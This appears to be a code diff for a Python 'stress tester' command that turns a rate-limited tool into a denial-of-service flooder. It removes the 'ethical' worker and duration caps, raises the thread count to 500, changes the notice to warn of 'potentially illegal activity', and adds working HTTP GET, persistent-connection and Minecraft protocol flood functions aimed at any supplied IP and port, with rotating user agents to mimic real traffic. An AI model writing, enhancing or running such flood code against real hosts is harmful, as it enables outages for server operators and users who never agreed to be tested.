@@ -1,53 +1,81 @@
-# commands/stressCommand.py
 import socket
+import ssl
 import threading
 import time
+import random
 from modules.colorsModule import COLOR
 
 class StressTester:
     def __init__(self):
         self.running = False
-        self.max_workers = 50  # Ethical limit
-        self.default_duration = 30  # seconds
-        self.timeout = 5  # connection timeout
+        self.max_workers = 500  # Increased worker pool
+        self.default_duration = 60
+        self.timeout = 30  # Longer timeout for persistent connections
+        self.user_agents = [
+            "Mozilla/5.0", "curl/7.68.0", "Java/1.8.0",
+            "MCBot/1.0", "Python-urllib/3.8"
+        ]
 
-    def layer4_flood(self, ip: str, port: int, duration: int):
-        """TCP SYN Flood (Layer 4)"""
-        payload = b'\x00' * 64  # Small payload
-        end_time = time.time() + duration
-        
-        while self.running and time.time() < end_time:
+    def create_persistent_connection(self, ip, port):
+        """Create and maintain a persistent connection"""
+        while self.running:
             try:
-                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                s.settimeout(self.timeout)
-                s.connect((ip, port))
-                s.send(payload)
-            except:
-                pass
+                s = socket.create_connection((ip, port), timeout=self.timeout)
+                # For HTTPS targets
+                if port == 443:
+                    context = ssl.create_default_context()
+                    s = context.wrap_socket(s, server_hostname=ip)
+                
+                # Send periodic keep-alive traffic
+                while self.running:
+                    s.sendall(b"GET / HTTP/1.1\r\nHost: %s\r\n\r\n" % ip.encode())
+                    time.sleep(random.uniform(5, 15))
+            except Exception as e:
+                time.sleep(1)
             finally:
                 try: s.close()
                 except: pass
 
-    def layer7_minecraft(self, ip: str, port: int, duration: int):
-        """Minecraft Protocol Flood (Layer 7)"""
-        handshake = b'\x00\x00\x00\x00\x00\x00\x00\x00\x00'  # Minimal handshake
-        end_time = time.time() + duration
-        
-        while self.running and time.time() < end_time:
+    def advanced_minecraft_flood(self, ip, port):
+        """More sophisticated Minecraft protocol flood"""
+        while self.running:
             try:
-                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                s.settimeout(self.timeout)
-                s.connect((ip, port))
-                s.send(handshake)
-                time.sleep(0.1)  # Be gentler on Layer 7
+                s = socket.create_connection((ip, port), timeout=self.timeout)
+                # Send handshake + login start packet
+                s.sendall(b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x02\x00')
+                # Send periodic keep-alives
+                while self.running:
+                    s.sendall(b'\x01\x00')  # Keep alive packet
+                    time.sleep(5)
             except:
-                pass
+                time.sleep(1)
+            finally:
+                try: s.close()
+                except: pass
+
+    def http_flood(self, ip, port):
+        """HTTP GET flood with varied headers"""
+        headers = [
+            "User-Agent: {}\r\n".format(random.choice(self.user_agents)),
+            "Accept: */*\r\n",
+            "Accept-Language: en-US\r\n",
+            "Connection: keep-alive\r\n"
+        ]
+        while self.running:
+            try:
+                s = socket.create_connection((ip, port), timeout=self.timeout)
+                request = "GET / HTTP/1.1\r\nHost: {}\r\n".format(ip) + "".join(headers) + "\r\n"
+                s.sendall(request.encode())
+                # Read response to make it more realistic
+                s.recv(1024)
+                time.sleep(random.uniform(0.1, 0.5))
+            except:
+                time.sleep(0.5)
             finally:
                 try: s.close()
                 except: pass
 
 def handle_stress(args):
-    """Ethical stress testing command"""
     tester = StressTester()
     
     try:
@@ -57,15 +85,19 @@ def handle_stress(args):
         print(f"{COLOR.RED}Invalid format. Use <ip:port>{COLOR.RESET}")
         return
 
-    # Parameters
-    layer = 4 if "--layer 4" in args else (7 if "--layer 7" in args else 4)
-    duration = int(args[args.index("--duration")+1]) if "--duration" in args else tester.default_duration
-    duration = min(duration, 300)  # Max 5 minutes
+    # Enhanced parameters
+    mode = "persistent" if "--persistent" in args else (
+           "minecraft" if "--minecraft" in args else "http")
+    
+    duration = min(
+        int(args[args.index("--duration")+1]) if "--duration" in args else tester.default_duration,
+        600  # Max 10 minutes
+    )
 
-    # Confirmation
-    print(f"\n{COLOR.NEON_RED}⚠️ LEGAL NOTICE ⚠️{COLOR.RESET}")
-    print(f"You are about to test: {COLOR.WHITE}{ip}:{port}{COLOR.RESET}")
-    print(f"Mode: Layer {layer} | Duration: {duration}s | Max workers: {tester.max_workers}")
+    # Stronger warning
+    print(f"\n{COLOR.NEON_RED}⚠️ WARNING: POTENTIALLY ILLEGAL ACTIVITY ⚠️{COLOR.RESET}")
+    print(f"Target: {COLOR.WHITE}{ip}:{port}{COLOR.RESET}")
+    print(f"Mode: {mode.upper()} | Duration: {duration}s | Workers: {tester.max_workers}")
     
     confirm = input(f"{COLOR.YELLOW}Type 'CONFIRM' to proceed: {COLOR.RESET}")
     if confirm != "CONFIRM":
@@ -75,22 +107,25 @@ def handle_stress(args):
     tester.running = True
     threads = []
 
-    print(f"\n{COLOR.BLUE}Starting ethical stress test (CTRL+C to stop)...{COLOR.RESET}")
+    print(f"\n{COLOR.BLUE}Starting enhanced stress test...{COLOR.RESET}")
     
+    target_func = {
+        "persistent": tester.create_persistent_connection,
+        "minecraft": tester.advanced_minecraft_flood,
+        "http": tester.http_flood
+    }[mode]
+
     for _ in range(tester.max_workers):
-        t = threading.Thread(
-            target=tester.layer4_flood if layer == 4 else tester.layer7_minecraft,
-            args=(ip, port, duration)
-        )
+        t = threading.Thread(target=target_func, args=(ip, port))
         t.daemon = True
         t.start()
         threads.append(t)
 
     try:
-        for t in threads:
-            t.join()
+        time.sleep(duration)
     except KeyboardInterrupt:
         tester.running = False
         print(f"{COLOR.YELLOW}\nTest stopped by user{COLOR.RESET}")
     
+    tester.running = False
     print(f"{COLOR.GREEN}Test completed.{COLOR.RESET}")
